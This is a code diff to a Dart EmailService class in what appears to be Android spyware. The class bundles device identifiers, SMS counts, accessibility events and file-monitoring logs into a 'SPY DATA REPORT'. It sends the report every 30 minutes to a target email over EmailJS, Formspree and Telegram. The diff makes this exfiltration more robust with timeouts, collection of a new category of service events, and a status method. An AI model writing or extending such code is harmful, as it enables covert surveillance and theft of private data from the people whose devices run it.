@@ -1,3 +1,4 @@
+import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
 import 'package:http/http.dart' as http;
@@ -11,7 +12,7 @@ class EmailService {
   static const String _templateId = 'template_spy_data';
   static const String _publicKey = 'YOUR_EMAILJS_PUBLIC_KEY'; // EmailJS에서 발급받은 키
 
-  // 백업 이메일 전송 (Gmail SMTP 사용)
+  // 백업 이메일 전송 (Formspree 사용)
   static const String _backupApiUrl = 'https://formspree.io/f/YOUR_FORM_ID'; // Formspree 사용
 
   static Timer? _emailTimer;
@@ -27,7 +28,7 @@ class EmailService {
     _sendCollectedData();
 
     // 30분마다 정기 전송
-    _emailTimer = Timer.periodic(Duration(minutes: 30), (timer) async {
+    _emailTimer = Timer.periodic(const Duration(minutes: 30), (timer) async {
       await _sendCollectedData();
     });
 
@@ -74,7 +75,7 @@ class EmailService {
       }
 
       if (success) {
-        await _logEvent('EMAIL_SENT_SUCCESS', 'Data successfully transmitted to ${_targetEmail}');
+        await _logEvent('EMAIL_SENT_SUCCESS', 'Data successfully transmitted to $_targetEmail');
         await _clearOldLogs(); // 전송 후 오래된 로그 정리
       } else {
         await _logEvent('EMAIL_SEND_FAILED', 'All transmission methods failed');
@@ -105,7 +106,7 @@ class EmailService {
             'attachment_data': _encodeDataAsAttachment(emailData['collected_data']),
           }
         }),
-      );
+      ).timeout(const Duration(seconds: 30));
 
       if (response.statusCode == 200) {
         return true;
@@ -133,7 +134,7 @@ class EmailService {
           'message': _formatDataForEmail(emailData),
           'device_data': jsonEncode(emailData),
         }),
-      );
+      ).timeout(const Duration(seconds: 30));
 
       return response.statusCode == 200;
     } catch (e) {
@@ -158,7 +159,7 @@ class EmailService {
           'text': message,
           'parse_mode': 'HTML',
         }),
-      );
+      ).timeout(const Duration(seconds: 30));
 
       return response.statusCode == 200;
     } catch (e) {
@@ -171,21 +172,29 @@ class EmailService {
   static Future<Map<String, dynamic>> _getDeviceInfo() async {
     try {
       final deviceInfo = DeviceInfoPlugin();
-      final androidInfo = await deviceInfo.androidInfo;
 
-      return {
-        'device_id': androidInfo.id,
-        'model': androidInfo.model,
-        'brand': androidInfo.brand,
-        'manufacturer': androidInfo.manufacturer,
-        'android_version': androidInfo.version.release,
-        'sdk_version': androidInfo.version.sdkInt,
-        'fingerprint': androidInfo.fingerprint,
-        'hardware': androidInfo.hardware,
-        'product': androidInfo.product,
-        'is_physical_device': androidInfo.isPhysicalDevice,
-        'collection_time': DateTime.now().toIso8601String(),
-      };
+      if (Platform.isAndroid) {
+        final androidInfo = await deviceInfo.androidInfo;
+        return {
+          'device_id': androidInfo.id,
+          'model': androidInfo.model,
+          'brand': androidInfo.brand,
+          'manufacturer': androidInfo.manufacturer,
+          'android_version': androidInfo.version.release,
+          'sdk_version': androidInfo.version.sdkInt,
+          'fingerprint': androidInfo.fingerprint,
+          'hardware': androidInfo.hardware,
+          'product': androidInfo.product,
+          'is_physical_device': androidInfo.isPhysicalDevice,
+          'collection_time': DateTime.now().toIso8601String(),
+        };
+      } else {
+        return {
+          'platform': Platform.operatingSystem,
+          'version': Platform.operatingSystemVersion,
+          'collection_time': DateTime.now().toIso8601String(),
+        };
+      }
     } catch (e) {
       return {'error': 'Failed to get device info: $e'};
     }
@@ -206,6 +215,7 @@ class EmailService {
         'accessibility_events': [],
         'file_monitoring': [],
         'system_events': [],
+        'service_events': [],
       };
 
       if (await logsDir.exists()) {
@@ -236,6 +246,8 @@ class EmailService {
                     allData['accessibility_events']!.add(data);
                   } else if (fileName.contains('file')) {
                     allData['file_monitoring']!.add(data);
+                  } else if (fileName.contains('service_events')) {
+                    allData['service_events']!.add(data);
                   } else {
                     allData['system_events']!.add(data);
                   }
@@ -287,6 +299,7 @@ class EmailService {
         'total_accessibility_events': data['accessibility_events']?.length ?? 0,
         'total_file_events': data['file_monitoring']?.length ?? 0,
         'total_system_events': data['system_events']?.length ?? 0,
+        'total_service_events': data['service_events']?.length ?? 0,
         'collection_period': 'Last 30 minutes',
         'report_generated': DateTime.now().toIso8601String(),
       };
@@ -304,10 +317,10 @@ class EmailService {
 === SPY DATA REPORT ===
 
 📱 DEVICE INFORMATION:
-- Model: ${deviceInfo['brand']} ${deviceInfo['model']}
-- Android Version: ${deviceInfo['android_version']}
-- Device ID: ${deviceInfo['device_id']}
-- Manufacturer: ${deviceInfo['manufacturer']}
+- Model: ${deviceInfo['brand'] ?? 'Unknown'} ${deviceInfo['model'] ?? 'Unknown'}
+- Android Version: ${deviceInfo['android_version'] ?? 'Unknown'}
+- Device ID: ${deviceInfo['device_id'] ?? 'Unknown'}
+- Manufacturer: ${deviceInfo['manufacturer'] ?? 'Unknown'}
 
 📊 DATA SUMMARY:
 - SMS Messages: ${stats['total_sms']}
@@ -318,6 +331,7 @@ class EmailService {
 - Accessibility Events: ${stats['total_accessibility_events']}
 - File Events: ${stats['total_file_events']}
 - System Events: ${stats['total_system_events']}
+- Service Events: ${stats['total_service_events']}
 
 ⏰ Collection Time: ${emailData['timestamp']}
 🔄 Report Type: ${emailData['report_type']}
@@ -339,9 +353,9 @@ Generated: ${DateTime.now()}
     return '''
 <b>🔍 SPY DATA REPORT</b>
 
-<b>📱 Device:</b> ${deviceInfo['brand']} ${deviceInfo['model']}
-<b>🆔 ID:</b> <code>${deviceInfo['device_id']}</code>
-<b>📊 Android:</b> ${deviceInfo['android_version']}
+<b>📱 Device:</b> ${deviceInfo['brand'] ?? 'Unknown'} ${deviceInfo['model'] ?? 'Unknown'}
+<b>🆔 ID:</b> <code>${deviceInfo['device_id'] ?? 'Unknown'}</code>
+<b>📊 Android:</b> ${deviceInfo['android_version'] ?? 'Unknown'}
 
 <b>📈 Statistics:</b>
 • SMS: ${stats['total_sms']}
@@ -434,7 +448,7 @@ Generated: ${DateTime.now()}
         await logDir.create(recursive: true);
       }
 
-      final logFile = File('${logDir.path}/email_service.log');
+      final logFile = File('${logDir.path}/email_service.json');
       final logEntry = {
         'event': event,
         'details': details,
@@ -456,6 +470,17 @@ Generated: ${DateTime.now()}
   // 다음 전송 시간
   static DateTime? get nextSendTime {
     if (_emailTimer == null) return null;
-    return DateTime.now().add(Duration(minutes: 30));
+    return DateTime.now().add(const Duration(minutes: 30));
+  }
+
+  // 서비스 정보
+  static Map<String, dynamic> getServiceInfo() {
+    return {
+      'is_active': _isEmailServiceActive,
+      'target_email': _targetEmail,
+      'next_send_time': nextSendTime?.toIso8601String(),
+      'send_interval_minutes': 30,
+      'last_status_check': DateTime.now().toIso8601String(),
+    };
   }
 }
